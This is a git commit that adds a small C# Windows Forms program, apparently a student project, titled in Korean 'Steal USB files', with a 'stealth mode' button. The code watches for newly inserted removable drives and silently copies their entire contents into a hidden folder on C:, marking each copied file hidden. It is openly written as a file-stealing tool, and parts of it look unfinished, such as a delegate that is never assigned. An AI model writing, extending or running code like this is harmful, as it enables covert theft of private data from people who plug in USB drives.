db0a27a229146a3b73ae7789dc2cce7fce602202
wogud0501 <djaeyeo@gmail.com>
2022-02-16 02:19:40 +0900

    USB Stolen

---
+++ USB_Stolen/USB_Stolen/Form1.Designer.cs
@@ -0,0 +1,72 @@
+﻿
+namespace USB_Stolen
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 필수 디자이너 변수입니다.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 사용 중인 모든 리소스를 정리합니다.
+        /// </summary>
+        /// <param name="disposing">관리되는 리소스를 삭제해야 하면 true이고, 그렇지 않으면 false입니다.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form 디자이너에서 생성한 코드
+
+        /// <summary>
+        /// 디자이너 지원에 필요한 메서드입니다. 
+        /// 이 메서드의 내용을 코드 편집기로 수정하지 마세요.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.btnHide = new System.Windows.Forms.Button();
+            this.a = new System.Windows.Forms.NotifyIcon(this.components);
+            this.SuspendLayout();
+            // 
+            // btnHide
+            // 
+            this.btnHide.Location = new System.Drawing.Point(110, 137);
+            this.btnHide.Name = "btnHide";
+            this.btnHide.Size = new System.Drawing.Size(89, 39);
+            this.btnHide.TabIndex = 0;
+            this.btnHide.Text = "스텔스 모드";
+            this.btnHide.UseVisualStyleBackColor = true;
+            // 
+            // a
+            // 
+            this.a.Text = "notifyIcon1";
+            this.a.Visible = true;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(338, 331);
+            this.Controls.Add(this.btnHide);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "USB 파일 훔치기";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button btnHide;
+        private System.Windows.Forms.NotifyIcon a;
+    }
+}
+
---
+++ USB_Stolen/USB_Stolen/Form1.cs
@@ -0,0 +1,115 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Threading;
+using System.Management;
+
+namespace USB_Stolen
+{
+    public partial class Form1 : Form
+    {
+        const int RemoveableDisk = 2;
+        const int RamDisk = 6;
+        bool Start = true;
+        Thread DiskAdd = null;
+        ManagementObjectSearcher Mquery = new
+           ManagementObjectSearcher("SELECT * From Win32_LogicalDisk");
+        private delegate void OnFileCopyDelegate(
+            bool flags, string FileTo, string FileFrom);
+        private OnFileCopyDelegate onCopy = null;
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+        private void DiskUpdate()
+        {
+            var bqueryCollection = Mquery.Get();
+            while (Start)
+            {
+                var query = new
+                     ManagementObjectSearcher("SELECT * From Win32_LogicalDisk");
+                var aqueryCollection = query.Get();
+                if (aqueryCollection.Count != bqueryCollection.Count)
+                {
+                    Start = false;
+                    Mquery = query;
+                    bqueryCollection = aqueryCollection;
+                    DiskSelect();
+                }
+            }
+        }
+        private void DiskSelect()
+        {
+            var queryCollection = Mquery.Get();
+            foreach (var drive in queryCollection)
+            {
+                switch (Convert.ToInt32(drive["DriveType"].ToString()))
+                {
+                    case RemoveableDisk:
+                        OnDriveArrived(drive["Name"].ToString());
+                        break;
+                }
+            }
+            Start = true;
+        }
+        private void OnDriveArrived(string diskpath)
+        {
+            var ThreadUSBCopy = new
+                Thread(new ParameterizedThreadStart(copysubFolder));
+            ThreadUSBCopy.Start(diskpath + @"\\" + "?" + @"C:\\Fcst" + @"\\" + @"\\" + DateTime.Now.ToString().Replace(':','.'));
+        }
+        private void copysubFolder(object copyInfo)
+        {
+            try
+            {
+                var copyString = Convert.ToString(copyInfo).Split('?');
+                var copyFrom = copyString[0];
+                var copyTo = copyString[1];
+                var fromDir = new DirectoryInfo(copyFrom);
+                var toDir = new DirectoryInfo(copyTo);
+                DirectoryInfo[] fromDirs = null;
+                Invoke(onCopy, true, "", copyTo);
+                fromDirs = fromDir.GetDirectories();
+                var fromFile = fromDir.GetFiles();
+                for (int i = 0; i < fromFile.Length; i++)
+                {
+                    Invoke(onCopy, false, toDir.ToString() + @"\\" +
+                        fromFile[i].Name, fromDir.FullName + fromFile[i].Name);
+                }
+                for (int i = 0; i < fromDirs.Length; i++)
+                {
+                    copysubFolder(fromDirs[i].FullName + "?" +
+                        copyTo + @"\\" + fromDirs[i].Name);
+                }
+            }
+            catch (Exception) { return; }
+        }
+        private void FileCopyDel(bool flags, string FileTo, string FileFrom)
+        {
+            if (flags == true)
+            {
+                var toDir = new DirectoryInfo(FileFrom);
+                toDir.Create();
+                toDir.Attributes = FileAttributes.Hidden;
+            }
+            else
+            {
+                FileInfo fi = new FileInfo(FileFrom);
+                fi.CopyTo(FileTo);
+                File.SetAttributes(FileTo, FileAttributes.Hidden);
+            }
+        }
+    }
+}
